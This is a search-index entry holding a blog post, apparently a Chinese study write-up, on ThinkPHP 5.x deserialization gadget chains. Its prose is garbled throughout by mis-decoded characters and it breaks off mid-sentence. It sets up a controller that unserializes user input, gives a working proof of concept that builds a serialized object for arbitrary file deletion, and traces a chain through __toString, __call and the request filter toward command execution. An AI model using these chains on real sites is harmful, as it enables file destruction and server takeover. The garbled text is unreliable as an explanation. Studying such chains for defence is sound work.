[{"title":"Thinkphp5.0.x~5.2.xç‰ˆæœ¬ååºåˆ—åŒ–é“¾æŒ–æ˜å­¦ä¹ ","url":"/post/60ce7176.html","content":"\nThinkphp5.0.x~5.2.xç‰ˆæœ¬ååºåˆ—åŒ–é“¾æŒ–æ˜å­¦ä¹ \n\n<!--more-->\n\n# åŸºç¡€çŸ¥è¯†\n\n## namespaceå‘½åç©ºé—´å’Œå­å‘½åç©ºé—´\n\né¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ä¸ºä»€ä¹ˆéœ€è¦å‘½åç©ºé—´å‘¢ï¼Ÿ\n\nåœ¨å¤§å‹PHPé¡¹ç›®ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¤§é‡çš„ç±»ï¼Œå‡½æ•°å’Œå¸¸é‡ï¼Œè€Œè¿™äº›å¯èƒ½æ¥è‡ªä¸åŒçš„åº“å’Œå›¢é˜Ÿï¼Œä¸ºäº†é¿å…å†²çªï¼Œphpå°±å¼•è¿›äº†å‘½åç©ºé—´ã€‚\n\n```plain\n<?php\nnamespace Animals\\cat;\nclass cat{\n    public function __construct(){\n        echo \"miao~\".\"\\n\";\n    }\n}\n$cat = new cat();\n\n\nnamespace Animals\\dog;\nclass dog{\n    public function __construct(){\n        echo \"wow\".\"\\n\";\n    }\n}\n$Dog = new dog();\n\n\nnamespace Animals\\bird;\nclass bird{\n    public function __construct(){\n        echo \"6\".\"\\n\";\n    }\n}\n$Bird = new bird();\n\n?>\n```\n\nä»¥ä¸Šä¾‹å­ä¸­ Animalså°±æ˜¯ä¸€ä¸ªå‘½ä»¤ç©ºé—´ è€Œcat dog bird éƒ½æ˜¯å…¶å­å‘½åç©ºé—´\n\nåœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™è¿™é‡Œä¹Ÿæœ‰è®²ç©¶ \n\nä¸€ç§æ˜¯ç›´æ¥åœ¨ç›¸å…³ç±»ä¹‹åè¿›è¡Œåˆ›å»ºå®ä¾‹ æ¯”å¦‚ï¼š\n\n```plain\nnamespace Animals\\cat;\nclass cat{\n    public function __construct(){\n        echo \"miao~\".\"\\n\";\n    }\n}\n$cat = new cat();\n```\n\nä¸€ç§æ˜¯å¯ä»¥åœ¨ä»»æ„åœ°æ–¹åˆ›å»º ä½†æ˜¯è¦åŠ ä¸Šå‘½åç©ºé—´ å³ï¼š`\\å‘½åç©ºé—´\\å­å‘½ä»¤ç©ºé—´\\classç±»å`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506070640-a0e9e936-106b-44f6-85f1-ee981404a6f3.png)\n\nè¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯åˆ©ç”¨use åœ¨è¿™é‡Œå¯ä»¥ç†è§£ä¸ºæ˜¯require inlcudeè¿™æ ·çš„å‡½æ•° \n\nå³å¯ä»¥åœ¨å½“å‰å‘½åç©ºé—´ä½¿ç”¨å¼•å…¥å…¶ä»–å‘½åç©ºé—´\n\næ¯”å¦‚æ ¹æ®ä»£ç é¡ºåº æˆ‘ä»¬åˆ›å»ºå®ä¾‹çš„ä»£ç éƒ½å±äºæ˜¯birdå‘½åç©ºé—´é‡Œçš„\n\nä¹Ÿå°±æ˜¯birdæ— éœ€æŒ‡å®šå‘½åç©ºé—´ ç›´æ¥ç”³æ˜å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506380739-b91e4da1-9830-4901-80af-9985cee77b0a.png)\n\nå¦‚æœä½¿ç”¨use åˆ™ç›´æ¥åˆ›å»ºå®ä¾‹æ—¶æ— éœ€åœ¨ä¹‹å‰åŠ ä¸Šå‘½åç©ºé—´äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506494614-a124ea63-0308-4205-8957-45b55753a1bd.png)\n\n## ç±»çš„ç»§æ‰¿\n\né€šè¿‡å…³é”®å­—extendsæ¥å®ç°\n\né€šè¿‡ä¸€ä¸ªdemoç®€å•ç†è§£\n\n```plain\n<?php\nclass father{\n    public $name = \"Tom\";\n    public $age = 100;\n    public function saysomething(){\n        echo \"father is saying\".\"\\n\";\n    }\n    public function sleeping(){\n        echo \"i am sleeping\".\"\\n\";\n    }\n}\nclass son extends father{\n    public $name = \"Lihua\";\n    public function saysomething(){\n        echo \"son is saying\".\"\\n\";\n    }\n    public function parentsaying(){\n        parent::saysomething();\n    }\n}\n$Son = new son;\necho $Son->age.\"\\n\";\n$Son->saysomething();\n$Son->parentsaying();\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507164342-e144b983-4bd2-4d60-8122-a6250e50533d.png)\n\nå¯ä»¥çœ‹åˆ°å­ç±»ä¼šç»§æ‰¿çˆ¶ç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œå½“ç„¶åªé™äºï¼ˆpublicå’Œprotectedç±»å‹è€Œprivateæ˜¯æ— æ³•ç»§æ‰¿ä¹Ÿæ— æ³•è®¿é—®çš„ï¼‰å­ç±»åŒåå‡½æ•°ä¼šè¦†ç›–çˆ¶ç±»ï¼Œå­ç±»ä¹Ÿå¯ä»¥é€šè¿‡`parent::method`è®¿é—®çˆ¶ç±»è¢«è¦†ç›–çš„æ–¹æ³•ã€‚\n\n## traitä¿®é¥°ç¬¦\n\ntraitä¿®é¥°ç¬¦ä½¿å¾—è¢«ä¿®é¥°çš„ç±»å¯ä»¥å¤ç”¨ï¼Œå¢åŠ äº†ä»£ç çš„å¤ç”¨æ€§\n\nå³æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªç±»ä¸­åŒ…å«ä¸€ä¸ªè¢«traitä¿®é¥°çš„ç±» å¹¶ä¸”ä½¿ç”¨å…¶æ–¹æ³•å’Œå±æ€§\n\n```plain\n<?php\ntrait test{\n    public $a = \"ok\";\n    public function test(){\n        echo \"test\\n\";\n    }\n}\n\nclass impl{\n    use test;\n    public function __construct()\n    {\n        echo \"impl\\n\";\n    }\n\n}\n$t=new impl();\n$t->test();\necho $t->a;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507738113-fb2c8dff-3d2e-40fe-a6d3-33cde99fe838.png)\n\nè¿˜æœ‰ä¸€ä¸ªbç¥ä¾‹å­ä¹Ÿå¯ä»¥æ¥ç†è§£ä¸€ä¸‹ æ–¹ä¾¿ä¹‹åå»è°ƒè¯•thinkphpé“¾å­\n\n```plain\n<?php\nnamespace np1\\A;\n\nuse np2\\A\\Boogipop;\n\nclass Z1d10t{\n    use Boogipop;\n    public function __construct()\n    {\n        echo \"dawn_construct\\n\";\n    }\n}\n<?php\nnamespace np2\\A;\nrequire(\"2.php\");\nuse np1\\A\\Z1d10t;\ntrait Boogipop{\n    public function __toString()\n    {\n        echo \"tostring\\n\";\n        return \"\";\n    }\n}\n$a=new Z1d10t();\necho $a;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701508172292-6203230e-df2e-41b6-96e6-83ae66b3fe69.png)\n\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç”¨traitä¿®é¥°äº†Boogipopç±»å¹¶ä¸”åœ¨Z1d10tä¸­useå¤ç”¨äº†å®ƒ\n\nç„¶åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªZ1d10tçš„ç±» å¹¶ä¸”ç›´æ¥è¾“å‡ºä»–\n\né‚£ä¹ˆæˆ‘ä»¬çŸ¥é“å½“ç›´æ¥è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶å€™å°±ä¼šè°ƒç”¨__toStringé­”æœ¯æ–¹æ³•\n\nä½†æ˜¯Z1d10tä¸­å¹¶æ²¡æœ‰__toStiringé­”æœ¯æ–¹æ³•è€ŒBoogipopç±»ä¸­æœ‰å´è¢«è°ƒç”¨äº† è¿™å°±å¾ˆç¥å¥‡äº†\n\n# 5.1.xç‰ˆæœ¬åˆ†æ\n\n## ç¯å¢ƒæ­å»º\n\n- \n\né‚£ä¹ˆå½“ç„¶æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£https://www.thinkphp.cn/doc\n\nè¿™é‡Œå»ºè®®åœ¨å®‰è£…æ—¶è€è€å®å®åˆ©ç”¨composer ç”¨gitçš„æ—¶å€™æŠ¥äº†å¥½å¤šé”™\n\næŠŠä¸‹è½½çš„æºç åŒ…æ”¾åˆ°phpstudyæ ¹ç›®å½•ä¸‹\n\nç„¶åå°±æ˜¯phpstudyè”åŠ¨phpstorm æ¨èä¸€ç¯‡æ–‡ç« ï¼š[phpstorm+phpstudyè°ƒè¯•thinkphp_å¦‚ä½•åœ¨phpstormä¸­è°ƒè¯•phpç¨‹åº-CSDNåšå®¢](https://blog.csdn.net/qq_62989306/article/details/126913050)\n\nè¿™é‡Œé‡åˆ°çš„å‘å°±æ˜¯æˆ‘composerä¸‹è½½æŒ‡å®šthinkphpç‰ˆæœ¬ä¸º5.1.37æ—¶ ä»–è‡ªåŠ¨ä¸‹è½½ä¸ºthinkphp5.1.42\n\næŠ˜ç£¨äº†æˆ‘ä¸€ä¸‹åˆ æœ€ç»ˆé—®gptå¾—åˆ°äº†è§£å†³æ–¹æ³•\n\nåœ¨æˆ‘ä»¬ä¸‹å¥½thinkphp5.1.42ç›®å½•ä¸‹ æœ‰ä¸ªcomposer.json å°†åŸæ¥çš„5.1.*æ”¹ä¸ºæŒ‡å®šçš„5.1.37\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517846484-9322664c-576b-4862-a671-9f8c4d7b8029.png)\n\nç„¶å `composer update` ä»–å°±ä¼šè‡ªåŠ¨é‡æ–°å¸®æˆ‘ä»¬æ‹‰å–ä¾èµ– \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517905050-35a888c9-067e-45a8-ac54-df0d659b36cb.png)\n\næœ€ç»ˆè§£å†³äº† å¯ä»¥æ„‰å¿«çš„è°ƒè¯•äº†\n\n## æŒ–æ˜\n\né¦–å…ˆæˆ‘ä»¬éœ€è¦è®¾ç½®ä¸€ä¸ªè§¦å‘ç‚¹ å°†æ§åˆ¶å™¨ä¸­çš„indexæ§åˆ¶å™¨ä¿®æ”¹ä¸º\n\n```plain\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index($input=\"\")\n    {\n        echo \"ThinkPHP5_Unserialize:\\n\";\n        unserialize(base64_decode($input));\n        return '<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style=\"padding: 24px 48px;\"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style=\"font-size:30px\">12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶</span></p></div><script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=64890268\" charset=\"UTF-8\"></script><script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"></script><think id=\"eab4b9f840753f8e7\"></think>';\n    }\n\n    public function hello($name = 'ThinkPHP5')\n    {\n        return 'hello,' . $name;\n    }\n}\n```\n\nç„¶ååœ¨ååºåˆ—åŒ–å…¥å£å‡½æ•°å¤„æ‰“ä¸€ä¸ªæ–­ç‚¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771728123-14c8df13-e5d2-454d-8f6f-26237ee644c5.png)\n\nå…ˆæµ‹è¯•æˆ‘ä»¬çš„poc å¯ä»¥å‘ç°æ˜¯å¯ä»¥æ­£å¸¸è§¦å‘çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771807938-8ed628fb-4a11-4ea4-a9a1-db0fe81e2f43.png)\n\næ¥ä¸‹æ¥ä¸€æ­¥æ­¥è°ƒè¯•\n\né¦–å…ˆæ˜¯è¿›å…¥äº†Windows.phpçš„Windowsç±»çš„ææ„å‡½æ•°\n\næˆ‘ä»¬è§‚å¯Ÿpoc ä¹Ÿå¯ä»¥å‘ç°æœ€å¤–å±‚å¥—çš„æ˜¯`think\\process\\pipes\\Windows`å¯¹è±¡ å› æ­¤é¦–å…ˆä¼šè¿›å…¥è¯¥å¯¹è±¡![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772315555-d5626d78-382d-4f16-99f6-3d4a602589b0.png)\n\nè¿™é‡Œwindowsç±»è¿˜ç»§æ‰¿äº†Pipesè¿™ä¸ªæŠ½è±¡ç±»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772344277-6435c36f-0019-440b-a1df-394f527d018b.png)\n\nç»§ç»­è·Ÿè¿› è¿›å…¥äº†removeFIlesè¿™ä¸ªå‡½æ•°ä¸­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772458028-3eae1587-619c-45f4-a948-b29042e3c6d4.png)\n\nè¯¥æ–¹æ³•ä¼šéå†filesæ•°ç»„ ç„¶ååˆ é™¤\n\nè¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ª`$this->files`å¹¶ä¸”$filesæ˜¯å¯æ§çš„å› æ­¤è¿™é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶åˆ é™¤çš„æ¼æ´\n\npocï¼š\n\n```plain\n<?php\nnamespace think\\process\\pipes;\n\nclass Pipes{\n\n}\n\nclass Windows extends Pipes\n{\nprivate $files = [];\n\npublic function __construct()\n{\n$this->files=['éœ€è¦åˆ é™¤æ–‡ä»¶çš„è·¯å¾„'];\n}\n}\n\necho base64_encode(serialize(new Windows()));\n?>\n```\n\n`file_exists`å‡½æ•°å¯¹`$filename`è¿›è¡Œå¤„ç†  å¹¶ä¸”æ­¤æ—¶`$filename`ä¼šè¢«å½“ä½œå­—ç¬¦ä¸²stringè¿›è¡Œå¤„ç†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773147093-5262c202-22e6-4d65-bb57-4cf9ebdae72e.png)\n\nå¹¶ä¸”æ ¹æ®æˆ‘ä»¬çš„pocå¯çŸ¥ æˆ‘ä»¬ä¼ å…¥çš„æ˜¯ Pivotå¯¹è±¡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773205554-8aeb5f36-68e4-4c53-8750-89cd614fe876.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773248506-71e26aca-d9cb-40d7-9972-064416dc6897.png)\n\né‚£å½“ä¸€ä¸ªå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è¢«å¤„ç†æ—¶ï¼Œä¼šè§¦å‘__toStringé­”æœ¯æ–¹æ³•\n\nç»§ç»­è·Ÿè¿› å‘ç°éš¾é“ä¸åº”è¯¥è§¦å‘Pivotå‡½æ•°çš„__toStringé­”æœ¯æ–¹æ³•å— ä¸ºä»€ä¹ˆä¼šè·³åˆ°Conversionå¯¹è±¡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773714546-13e03ac3-a462-4633-92a3-9e59c7a4b68e.png)\n\nè¿™é‡Œå°±ç”¨åˆ°äº†ä¹‹å‰è¯´çš„traitå¤ç”¨çš„çŸ¥è¯†ç‚¹äº†\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ° Convertionè¢«traitä¿®é¥°äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773898203-2f4d1683-7279-4aa4-97f3-29d28fd667ed.png)\n\nå¹¶ä¸”Pivotå¯¹è±¡åŸºç±»æ˜¯Model å®ƒå†…éƒ¨æ²¡æœ‰toStringé­”æœ¯æ–¹æ³• \n\nä½†æ˜¯æ„é€ å‡½æ•°ä¸­è°ƒç”¨çš„æ˜¯çˆ¶ç±»çš„æ„é€ æ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701774046856-246081eb-2a34-4ff6-8c3f-dc09dd85a82b.png)\n\næˆ‘ä»¬ç»§ç»­è·Ÿè¿›Modelç±» å¯ä»¥å‘ç°å®ƒuseäº†`model\\concern\\Conversion`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775270704-d7d5025e-ece6-4412-a53c-0e18d905cfb6.png)\n\nå› æ­¤Modelå¤ç”¨äº†Conversionç±» è€Œå®ƒåˆæ˜¯Pivotç±»çš„çˆ¶ç±» \n\nå½“Pivotå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºçš„æ—¶å€™ å°±ä¼šè°ƒç”¨Conversionç±»çš„toStringæ–¹æ³•\n\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘è·Ÿè¿›é“¾å­åˆ°äº† Converisonç±»çš„tostringæ–¹æ³•äº† \n\næ€è·¯æ¸…æ™° ç»§ç»­\n\næ¥ç€è°ƒç”¨äº†toJsonå‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775565756-3c86b4e4-0a76-4460-a8e9-23d85dc135a0.png)\n\næ¥ç€è°ƒç”¨äº†toArrayå‡½æ•° ç„¶åè½¬ä¸ºäº†jsonå­—ç¬¦ä¸² ç»§ç»­è·Ÿè¿›toArray\n\nå…ˆéå†this->appendå±æ€§ å–å‡ºé”®å€¼å¯¹ å¯¹åº”æˆ‘ä»¬pocä¸­çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775854515-40420207-d28d-4c61-86fb-026aedf3c565.png)\n\nkeyä¸ºZ1d10t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775999642-0e5e090f-8e16-436c-bf49-8f31f4aa886e.png)\n\næ¥ç€è¿›å…¥getRelationå‡½æ•°ä¸­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776064817-0cafd189-bcf1-41a7-b4a9-096cae286ecf.png)\n\nå› ä¸ºæˆ‘ä»¬æ²¡æœ‰ç»™`$this->relation`èµ‹å€¼ å› æ­¤return nullå°±ç»“æŸå¹¶ä¸”å‡ºæ¥äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776176513-ca575be3-1319-4576-af3d-6f35ee28351d.png)\n\næ¥ç€è¿›å…¥getAttrå‡½æ•°\n\npocä¸­æˆ‘ä»¬å°†`$this->data`èµ‹å€¼ä¸ºä¸€ä¸ªå¯¹è±¡ å› æ­¤returnä¸€ä¸ªRequestå¯¹è±¡ä¹‹å å°±ä¼šé€€å‡ºè¯¥æ–¹æ³• å‡ºæ¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776480917-1ed0551f-cb6c-4d22-a302-eacaf644d712.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701847452355-9384cf4e-7e1d-44cb-a11d-320102b41f90.png)\n\n`$relation`å˜ä¸ºäº†Requestå¯¹è±¡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776652298-17f4b401-e97e-4293-9f0f-cd0dad786c79.png)\n\nè°ƒç”¨`$relation->visible()` å¹¶ä¸”å‚æ•°ä¸º`[calc,calc.exe]`  è€ŒRequsetç±»æ˜¯æ²¡æœ‰visibleå‡½æ•°çš„\n\nå› æ­¤ä¼šè°ƒç”¨å®ƒçš„__callæ–¹æ³• \n\nä¸€èˆ¬PHPä¸­çš„__callæ–¹æ³•éƒ½æ˜¯ç”¨æ¥è¿›è¡Œå®¹é”™æˆ–è€…æ˜¯åŠ¨æ€è°ƒç”¨,æ‰€ä»¥ä¸€èˆ¬ä¼šåœ¨__callæ–¹æ³•ä¸­ä½¿ç”¨\n\n```\n__call_user_func($method, $args) \n__call_user_func_array([$obj,$method], $args)\n```\n\næˆ‘ä»¬è·Ÿè¿›å®ƒ\n\nå‘ç°å®ƒè°ƒç”¨ `call_user_func_array`æ–¹æ³• è¿™å¯ä¸æ˜¯ä¸€ä¸ªå¥½æ–¹æ³•:)\n\nå¹¶ä¸”è¿™é‡Œ$hookæ˜¯æˆ‘ä»¬å¯æ§çš„ å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ªæ•°ç»„`$hook= {â€œvisableâ€=>â€ä»»æ„methodâ€}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777056201-b2143552-59e9-49a5-88a2-70c0d3f5632d.png)\n\nä½†æ˜¯åœ¨è¿™é‡Œarray_unshiftå‡½æ•°åœ¨ä¹‹å‰çš„`[calc,calc.exe]`æ•°ç»„å¼€å¤´ä¸­æ’å…¥Requestå¯¹è±¡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777151041-f0aa6009-994d-4ac8-aa00-307fb4075910.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777278378-bdcef651-2589-47c6-9af7-e41df72e38d6.png)\n\næˆ‘ä»¬çŸ¥é“`call_user_func_array`å‡½æ•°ä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œç¬¬äºŒå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”å°†æ•°ç»„ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701778235498-ff04b99e-9809-47cb-a359-5531b29dd4d7.png)\n\n`$this->hook`ä¸ºä¸€ä¸ªæ•°ç»„å¹¶ä¸”æˆ‘ä»¬å¯æ§ ç„¶åå–é”®åä¸ºvisibleçš„å€¼\n\né‚£ä¹ˆæˆ‘ä»¬åªèƒ½æ˜¯ï¼ˆå·çš„ï¼‰\n\n```plain\ncall_user_func_array([$obj,\"ä»»æ„æ–¹æ³•\"],[$this,ä»»æ„å‚æ•°])\nä¹Ÿå°±æ˜¯\n$obj->$func($this,$argv)\n```\n\né‚£è¿™é‡Œéœ€è¦çŸ¥é“çš„æ˜¯å›è°ƒå‡½æ•°ä¸å…‰åªæ˜¯ç®€ç®€å•å•çš„æ™®é€šå‡½æ•°\n\nè¿˜å¯ä»¥æ˜¯å¯¹è±¡çš„æ–¹æ³• åŒ…æ‹¬é™æ€ç±»æ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779197684-4971d72a-f30b-46a7-8878-ba2e5b952d49.png)\n\nå› æ­¤è¿™é‡Œå°±å¯ä»¥ç†è§£ä¸Šè¿°ä¸­call_user_func_arrayä¸­ç¬¬ä¸€ä¸ªå‚æ•°å‡½æ•°æ ¼å¼ä¸º`[$obj,\"ä»»æ„æ–¹æ³•\"]`ä¹Ÿå°±æ˜¯å¯¹è±¡çš„æ–¹æ³•\n\nè€Œå‚æ•°ç”±äºarray_unshiftå‡½æ•°çš„ç¼˜æ•…ç¬¬ä¸€ä¸ªä¸º`$this`ä¹Ÿå°±æ˜¯ä¸€ä¸ªå¯¹è±¡\n\n`$obj->$func($this,$argv)`é‚£ä¹ˆç›´æ¥ç”¨è¿™ç§æ–¹å¼å»RCE å¾ˆéš¾çš„æ‹‰\n\næ­¤æ—¶å°±è¦ç”¨åˆ°äº†Requestç±»ä¸­ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½å°±æ˜¯è¿‡æ»¤å™¨filter\n\nå¹¶ä¸”ThinkPHPä¸­çš„å¤šä¸ªRCEæ¼æ´éƒ½æ˜¯ç”±äºè¿™ä¸ªè¿‡æ»¤å™¨\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»å°è¯•è¦†ç›–filteræ–¹æ³•å»RCE\n\næˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªfilter\n\n```plain\nprivate function filterValue(&$value, $key, $filters)\n    {\n        $default = array_pop($filters);\n\n        foreach ($filters as $filter) {\n            if (is_callable($filter)) {\n                // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤\n                $value = call_user_func($filter, $value);\n            } elseif (is_scalar($value)) {\n                if (false !== strpos($filter, '/')) {\n                    // æ­£åˆ™è¿‡æ»¤\n                    if (!preg_match($filter, $value)) {\n                        // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼\n                        $value = $default;\n                        break;\n                    }\n                } elseif (!empty($filter)) {\n                    // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤\n                    // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id\n                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));\n                    if (false === $value) {\n                        $value = $default;\n                        break;\n                    }\n                }\n            }\n        }\n\n        return $value;\n    }\n```\n\nè¯¥æ–¹æ³•è°ƒç”¨äº†`call_user_func` ä½†æ˜¯åœ¨è¿™é‡Œ`$value`å‚æ•°ä¸å¯ç›´æ¥æ§ \n\nç»§ç»­å¯»æ‰¾\n\nå‘ç°inputå‡½æ•°è°ƒç”¨äº†è¿™ä¸ªfilterValue\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779812219-588beaf8-9bb2-44da-abb7-9c14ed94ec2c.png)\n\n```plain\n public function input($data = [], $name = '', $default = null, $filter = '')\n    {\n        if (false === $name) {\n            // è·å–åŸå§‹æ•°æ®\n            return $data;\n        }\n\n        $name = (string) $name;\n        if ('' != $name) {\n            // è§£æname\n            if (strpos($name, '/')) {\n                list($name, $type) = explode('/', $name);\n            }\n\n            $data = $this->getData($data, $name);\n\n            if (is_null($data)) {\n                return $default;\n            }\n\n            if (is_object($data)) {\n                return $data;\n            }\n        }\n\n        // è§£æè¿‡æ»¤å™¨\n        $filter = $this->getFilter($filter, $default);\n\n        if (is_array($data)) {\n            array_walk_recursive($data, [$this, 'filterValue'], $filter);\n            if (version_compare(PHP_VERSION, '7.1.0', '<')) {\n                // æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ\n                $this->arrayReset($data);\n            }\n        } else {\n            $this->filterValue($data, $name, $filter);\n        }\n\n        if (isset($type) && $data !== $default) {\n            // å¼ºåˆ¶ç±»å‹è½¬æ¢\n            $this->typeCast($data, $type);\n        }\n\n        return $data;\n    }\n```\n\nä½†æ˜¯è¿™é‡Œå‚æ•°ä»æ—§ä¸å¯æ§ ä¸èƒ½ç›´æ¥ä½¿ç”¨\n\né‚£ä¹ˆç»§ç»­çœ‹çœ‹è°è°ƒç”¨äº†input å¥—å¨ƒå°±å®Œäº‹äº†\n\né‚£ä¹ˆè¿™é‡Œæ˜¯æ‰¾åˆ°äº†paramå‡½æ•° ä¸è¿‡å‚æ•°ä»æ—§ä¸å¯æ§\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779998764-57f74acd-6dab-437f-a507-7a4ffcb6e633.png)\n\n```plain\npublic function param($name = '', $default = null, $filter = '')\n    {\n        if (!$this->mergeParam) {\n            $method = $this->method(true);\n\n            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡\n            switch ($method) {\n                case 'POST':\n                    $vars = $this->post(false);\n                    break;\n                case 'PUT':\n                case 'DELETE':\n                case 'PATCH':\n                    $vars = $this->put(false);\n                    break;\n                default:\n                    $vars = [];\n            }\n\n            // å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶\n            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));\n\n            $this->mergeParam = true;\n        }\n\n        if (true === $name) {\n            // è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„\n            $file = $this->file();\n            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;\n\n            return $this->input($data, '', $default, $filter);\n        }\n\n        return $this->input($this->param, $name, $default, $filter);\n    }\n```\n\nç»§ç»­å¯»æ‰¾è°è°ƒç”¨äº†param\n\næ‰¾åˆ°äº† isAjaxå‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701780098519-a4d71b56-0839-4ef4-a226-8d9dcb651cba.png)\n\n```plain\n public function isPjax($pjax = false)\n    {\n        $result = !is_null($this->server('HTTP_X_PJAX')) ? true : false;\n\n        if (true === $pjax) {\n            return $result;\n        }\n\n        $result           = $this->param($this->config['var_pjax']) ? true : $result;\n        $this->mergeParam = false;\n        return $result;\n    }\n```\n\nè€ŒisAjaxå‡½æ•°ä¸­ æˆ‘ä»¬å¯æ§`$this->config['var_pjax']`\n\næ„å‘³ç€paramå‡½æ•°ä¸­`$name`å¯æ§\n\næ„å‘³ç€inputå‡½æ•°ä¸­çš„`$name`å¯æ§\n\nåœ¨è¿™é‡Œ ä»¥ä¸Šæˆ‘ä»¬è¯´ä»€ä¹ˆå¯æ§ 